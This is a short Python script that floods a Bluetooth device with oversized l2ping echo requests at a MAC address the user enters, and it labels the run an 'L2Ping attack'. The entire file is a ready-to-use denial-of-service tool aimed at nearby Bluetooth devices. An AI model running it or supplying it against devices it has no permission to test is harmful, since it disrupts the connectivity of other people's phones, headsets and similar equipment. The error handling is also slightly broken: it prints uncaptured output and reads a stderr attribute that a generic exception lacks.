import subprocess

def l2ping_attack(mac):
    print(f"---   Starting L2Ping attack on {mac}   ---")
    
    # Run the l2ping command
    try:
        result = subprocess.run(["sudo", "l2ping", "-i", "hci0", "-s", "600", "-f", mac])
        print(result.stdout)
    except Exception as e:
        print(f"Error during L2Ping attack: {e.stderr}")
    
    print("\n---   L2Ping attack complete.   ---")

if __name__ == "__main__":
    mac = input("Enter the MAC address of the target device: ")
    l2ping_attack(mac)